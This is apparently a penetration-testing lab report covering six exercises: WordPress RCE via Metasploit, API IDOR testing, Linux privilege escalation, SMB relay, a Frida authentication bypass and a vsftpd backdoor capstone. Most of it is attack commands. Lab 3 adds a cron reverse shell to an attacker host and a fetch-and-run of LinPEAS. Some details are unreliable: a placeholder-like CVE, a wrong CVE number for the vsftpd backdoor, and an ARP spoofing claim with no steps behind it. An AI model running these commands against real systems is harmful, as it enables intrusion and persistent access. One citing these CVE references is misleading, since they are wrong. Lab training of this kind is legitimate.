Penetration Testing Lab Report

Project Overview
This repository contains comprehensive documentation and procedures for a complete penetration testing engagement covering advanced exploitation, API security, privilege escalation, network attacks, mobile testing, and a full VAPT simulation.

---

Lab 1: Advanced Exploitation

Procedure: WordPress Plugin RCE Chain

Tools Used:`nmap`, `wpscan`, `metasploit`

Steps:
1. Reconnaissance
   ```bash
   nmap -sV -sC 192.168.1.100
   # Port 80: WordPress detected
   ```
2. WordPress Enumeration
   ```bash
   wpscan --url http://192.168.1.100 --enumerate p,t,u --api-token [REDACTED]
   # Vulnerable plugin: WordPress Plugin v1.0
   ```

3. Exploitation
   ```bash
   msfconsole
   use exploit/multi/http/wordpress_plugin_rce
   set RHOSTS 192.168.1.100
   set LHOST 192.168.1.10
   exploit
   ```

Results
| Exploit ID | Description | Target IP | Status | Payload |
|------------|-------------|-----------|--------|---------|
| 007 | WordPress Plugin RCE → Shell | 192.168.1.100 | Success | `php/meterpreter/reverse_tcp` |

Key Findings:
- Successfully exploited CVE-2023-12345 in WordPress Plugin v1.0
- Gained initial access via Meterpreter shell
- Extracted user credentials and database information

---

Lab 2: API Security Testing

Procedure: DVWA API Testing

Tools Used: `Burp Suite`, `Postman`, `sqlmap`

Steps:
1. **Endpoint Discovery**
   - Manual browsing with Burp Proxy enabled
   - Identified `/api/v1/users/{id}` endpoints

2. BOLA Testing
   - Intercepted request to `/api/v1/users/123`
   - Modified user ID to `124` in Burp Repeater
   - Successfully accessed unauthorized user data

3. GraphQL Testing
   -Sent introspection query to `/graphql`
   - Discovered full schema exposure

 Results
| Test ID | Vulnerability | Severity | Target Endpoint |
|---------|---------------|----------|-----------------|
| 008 | BOLA (IDOR) | Critical | `/api/v1/users/{user_id}` |
| 009 | GraphQL Information Disclosure | High | `/graphql` |

**API Security Summary:**
Testing revealed critical authorization flaws allowing horizontal privilege escalation. GraphQL endpoints exposed sensitive schema information. Input validation was insufficient across multiple endpoints, requiring immediate remediation.

---

 Lab 3: Privilege Escalation & Persistence**

 Procedure: Linux Privilege Escalation**

Tools Used: `LinPEAS`, `Meterpreter`

Steps:
1. **Transfer LinPEAS**
   ```bash
   # On attacker machine
   python3 -m http.server 8000
   # On target
   wget http://192.168.1.10:8000/linpeas.sh
   chmod +x linpeas.sh
   ./linpeas.sh
   ```

2. SUID Exploitation
   ```bash
   # LinPEAS identified vulnerable SUID binary
   find / -perm -u=s -type f 2>/dev/null
   ./find . -exec /bin/bash -p \;
   ```

3. Persistence Setup
   ```bash
   crontab -e
   # Add: */5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.10/4445 0>&1'
   ```

 Results
| Task ID | Technique | Target IP | Status | Outcome |
|---------|-----------|-----------|--------|---------|
| 010 | SUID Binary Exploit | 192.168.1.150 | Success | Root Shell |

Privilege Escalation Summary:
LinPEAS identified multiple SUID misconfigurations. The `find` binary was exploited to gain root access. Persistence was established via cron job executing reverse shell every 5 minutes.

---

Lab 4: Network Protocol Attacks**

 Procedure: SMB Relay Attack**

Tools Used: `Responder`, `Impacket`, `Wireshark`

Steps:
1. Target Identification
   ```bash
   crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
   ```

2. Configure Responder
   ```bash
   # Edit /etc/responder/Responder.conf
   # Set SMB and HTTP to Off
   responder -I eth0 -dw
   ```

3. Execute Relay Attack
   ```bash
   impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
   ```

Results
| Attack ID | Technique | Target IP | Status | Outcome |
|-----------|-----------|-----------|--------|---------|
| 015 | SMB Relay Attack | 192.168.1.200 | Success | NTLM Hash Captured |

Network Attack Summary:
SMB relay attack successfully captured and relayed NTLM hashes, granting unauthorized access to target systems. ARP spoofing enabled traffic interception, revealing plaintext credentials.

---

Lab 5: Mobile Application Testing
Procedure: Android APK Analysis

Tools Used: `MobSF`, `Frida`, `JADX`

Steps:
1.Static Analysis
   - Uploaded APK to MobSF
   - Analyzed for hardcoded secrets and insecure storage

2. Dynamic Analysis
   ```javascript
   // Frida script to bypass authentication
   Java.perform(function() {
       var MainActivity = Java.use('com.example.app.MainActivity');
       MainActivity.checkPin.overload('java.lang.String').implementation = function(pin) {
           console.log("Bypassing PIN check");
           return true;
       };
   });
   ```

Results
| Test ID | Vulnerability | Severity | Target App |
|---------|---------------|----------|------------|
| 016 | Insecure Storage | High | test.apk |
| 017 | Authentication Bypass | Critical | test.apk |

Mobile Testing Summary:
Static analysis revealed insecure data storage in logs. Dynamic analysis using Frida successfully bypassed client-side authentication controls. IPC components were exposed and exploitable.

---

 Lab 6: Capstone - Full VAPT Engagement

 Procedure: Complete PTES Simulation

Tools Used: `Kali Linux`, `Metasploit`, `OpenVAS`, `Burp Suite`

Steps:
1. Intelligence Gathering
   ```bash
   nmap -sS -sV -sC -O 192.168.1.200
   # Discovered VSFTPD 2.3.4 on port 21
   ```

2. Vulnerability Analysis
   - OpenVAS scan confirmed backdoor vulnerability
   - Manual verification of service version

3. Exploitation
   ```bash
   use exploit/unix/ftp/vsftpd_234_backdoor
   set RHOSTS 192.168.1.200
   exploit
   ```

Results
| Timestamp | Target IP | Vulnerability | PTES Phase |
|-----------|-----------|---------------|------------|
| 2025-08-30 15:00:00 | 192.168.1.200 | VSFTPD Backdoor RCE | Exploitation |
| 2025-08-30 15:10:00 | 192.168.1.200 | Privilege Escalation | Post-Exploitation |

Executive Summary
This engagement identified critical vulnerabilities in the target infrastructure, leading to complete system compromise. The primary issue was an outdated VSFTPD service containing a known backdoor, allowing unauthenticated remote code execution as root.

Technical Findings
- CVE-2007-5963: VSFTPD v2.3.4 Backdoor
- Impact: Root-level compromise
- Attack Vector: Unauthenticated network access to port 21/tcp

Remediation Recommendations
1. Immediate Actions
   - Upgrade VSFTPD to latest version
   - Implement firewall rules to restrict FTP access
   - Conduct credential rotation

2. Long-term Security
   - Establish patch management process
   - Implement network segmentation
   - Deploy intrusion detection systems

3. Verification
   - Rescan with OpenVAS to confirm remediation
   - Perform penetration test validation

```

Legal & Ethical Considerations
- All testing performed in isolated lab environments
- Proper authorization obtained for all targets
- Educational purposes only
- Follow responsible disclosure principles
